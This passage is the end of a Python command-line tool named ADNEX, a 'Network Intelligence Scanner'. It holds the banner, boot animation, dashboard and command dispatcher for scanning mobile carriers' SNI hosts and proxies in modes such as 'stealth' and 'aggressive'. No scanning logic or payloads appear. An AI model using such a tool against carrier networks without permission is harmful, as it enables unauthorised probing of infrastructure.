        f"  [{G}] ██╔══██╗██╔══██╗████╗  ██║██╔════╝╚██╗██╔╝[/]",
        f"  [{P}] ███████║██║  ██║██╔██╗ ██║█████╗   ╚███╔╝ [/]",
        f"  [{P}] ██╔══██║██║  ██║██║╚██╗██║██╔══╝   ██╔██╗ [/]",
        f"  [{C}] ██║  ██║██████╔╝██║ ╚████║███████╗██╔╝ ██╗[/]",
        f"  [{C}] ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝[/]",
    ]
    console.print()
    for line in lines:
        console.print(line)
    console.print(f"\n  [{G}]{TOOL} {VERSION}[/]  [{W}]Network Intelligence Scanner[/]")
    console.print(f"  [{G}]{'─'*50}[/]\n")

def boot_sequence():
    console.clear()
    print_banner()
    steps = [
        "Loading carrier database",
        "Initializing async engine",
        "Priming SNI probe vectors",
        "Configuring proxy validators",
        "Setting up export pipeline",
        "All systems operational",
    ]
    with Progress(
        SpinnerColumn(style=f"bold {G}"),
        TextColumn(f"[{G}]{{task.description}}[/]"),
        BarColumn(bar_width=35, style=DG, complete_style=G, finished_style=P),
        TextColumn(f"[{G}]{{task.percentage:>3.0f}}%[/]"),
        TimeElapsedColumn(),
        console=console, transient=False
    ) as prog:
        task = prog.add_task("Booting...", total=len(steps))
        for step in steps:
            prog.update(task, description=step, advance=1)
            time.sleep(random.uniform(0.1, 0.3))
    console.print(f"\n  [{P}]► {TOOL} READY. Type 'help' for commands.[/]\n")

def print_dashboard():
    si = get_sysinfo()
    console.print(f"  [{G}]{'═'*55}[/]")
    console.print(f"  [{P}]{TOOL} {VERSION}[/]  [{G}]Network Intelligence Scanner[/]")
    console.print(f"  [{G}]{'─'*55}[/]")
    console.print(f"  [{C}]OS:[/] [{G}]{si['platform']}[/]  [{C}]CPU:[/] [{G}]{si['cpu']}%[/]  [{C}]RAM:[/] [{G}]{si['ram_used']}/{si['ram_total']}GB ({si['ram_pct']}%)[/]")
    console.print(f"  [{C}]STATUS:[/] [{P if scan_state['scanning'] else G}]{'SCANNING' if scan_state['scanning'] else 'IDLE'}[/]  [{C}]HITS:[/] [{P}]{scan_state['hits']}[/]  [{C}]PROXIES:[/] [{G}]{len(scan_state['proxies'])}[/]  [{C}]SNI:[/] [{G}]{len(scan_state['sni'])}[/]")
    console.print(f"  [{G}]{'─'*55}[/]")
    console.print(f"  [{P}]CARRIERS:[/]")
    row = ""
    for i,(key,val) in enumerate(CARRIERS.items(),1):
        row += f"  [{C}][{i:02d}][/] [{G}]{key}[/]"
        if i % 3 == 0:
            console.print(row)
            row = ""
    if row:
        console.print(row)
    console.print(f"  [{G}]{'─'*55}[/]")
    console.print(f"  [{Y}]scan <carrier/number> | turbo | deepsni | commonsni | results | export | help | exit[/]")
    console.print(f"  [{G}]{'═'*55}[/]\n")

def handle(cmd_input, cfg):
    parts = cmd_input.strip().split()
    if not parts:
        return
    cmd = parts[0].lower()
    arg1 = parts[1].lower() if len(parts) > 1 else ""
    arg2 = parts[2].lower() if len(parts) > 2 else "balanced"

    carrier_by_num = {str(i+1): k for i,k in enumerate(CARRIERS.keys())}

    def resolve_carrier(val):
        if val in CARRIERS:
            return val
        if val in carrier_by_num:
            return carrier_by_num[val]
        return None

    if cmd == "exit" or cmd == "quit":
        console.print(f"\n  [{P}]► Exiting {TOOL}. Goodbye.[/]\n")
        sys.exit(0)

    elif cmd in ("help","h","?"):
        cmd_help()

    elif cmd == "list" or cmd == "carriers":
        cmd_list()

    elif cmd == "scan":
        carrier = resolve_carrier(arg1)
        if not carrier:
            console.print(f"  [{P}]Usage: scan <carrier or number>[/]")
            console.print(f"  [{G}]Use 'list' to see carriers.[/]")
        else:
            cmd_scan(carrier, "balanced", cfg)

    elif cmd == "turbo":
        carrier = resolve_carrier(arg1)
        if not carrier:
            console.print(f"  [{P}]Usage: turbo <carrier>[/]")
        else:
            cmd_scan(carrier, "turbo", cfg)

    elif cmd == "aggressive":
        carrier = resolve_carrier(arg1)
        if not carrier:
            console.print(f"  [{P}]Usage: aggressive <carrier>[/]")
        else:
            cmd_scan(carrier, "aggressive", cfg)

    elif cmd == "stealth":
        carrier = resolve_carrier(arg1)
        if not carrier:
            console.print(f"  [{P}]Usage: stealth <carrier>[/]")
        else:
            cmd_scan(carrier, "stealth", cfg)

    elif cmd == "ultra":
        carrier = resolve_carrier(arg1)
        strategy = arg2 if arg2 in SCAN_STRATEGIES else "balanced"
        if not carrier:
            console.print(f"  [{P}]Usage: ultra <carrier> <strategy>[/]")
        else:
            cmd_scan(carrier, strategy, cfg)

    elif cmd == "deepsni":
        carrier = resolve_carrier(arg1)
        if not carrier:
            console.print(f"  [{P}]Usage: deepsni <carrier>[/]")
        else:
            cmd_deepsni(carrier, cfg)

    elif cmd == "commonsni":
        cmd_commonsni(cfg)

    elif cmd == "stop":
        cmd_stop()

    elif cmd == "status":
        cmd_status()

    elif cmd == "results":
        cmd_results()

    elif cmd == "export":
        carrier = resolve_carrier(arg1)
        if not carrier:
            console.print(f"  [{P}]Usage: export <carrier>[/]")
        else:
            cmd_export(carrier)

    elif cmd == "geo":
        if not arg1:
            console.print(f"  [{P}]Usage: geo <ip>[/]")
        else:
            cmd_geo(arg1)

    elif cmd == "validate":
        if not arg1 or ":" not in arg1:
            console.print(f"  [{P}]Usage: validate <ip:port>[/]")
        else:
            ip_v, port_v = arg1.split(":", 1)
            if port_v.isdigit():
                cmd_validate(ip_v, int(port_v), cfg)
            else:
                console.print(f"  [{P}]Invalid port.[/]")

    elif cmd == "flush":
        cmd_flush()

    elif cmd == "history":
        cmd_history()

    elif cmd == "netinfo":
        cmd_netinfo()

    elif cmd == "config":
        cmd_config(cfg)

    elif cmd == "dashboard":
        print_dashboard()

    elif cmd == "clear":
        console.clear()
        print_dashboard()

    elif cmd in carrier_by_num:
        carrier = carrier_by_num[cmd]
        console.print(f"  [{G}]► Shortcut: scan {carrier}[/]")
        cmd_scan(carrier, "balanced", cfg)

    else:
        console.print(f"  [{P}]Unknown command: '{cmd}'[/]  [{G}]Type 'help'[/]")

def main():
    setup_dirs()
    cfg = load_config()
    boot_sequence()
    print_dashboard()
    while True:
        try:
            sys.stdout.write(f"adnex~$ ")
            sys.stdout.flush()
            line = sys.stdin.readline()
            if not line:
                break
            cmd = line.strip()
            if cmd:
                handle(cmd, cfg)
        except KeyboardInterrupt:
            console.print(f"\n  [{P}]► Ctrl+C detected. Type 'exit' to quit.[/]")
        except Exception as e:
            console.print(f"  [{P}]Error: {e}[/]")

if __name__ == "__main__":
    main()
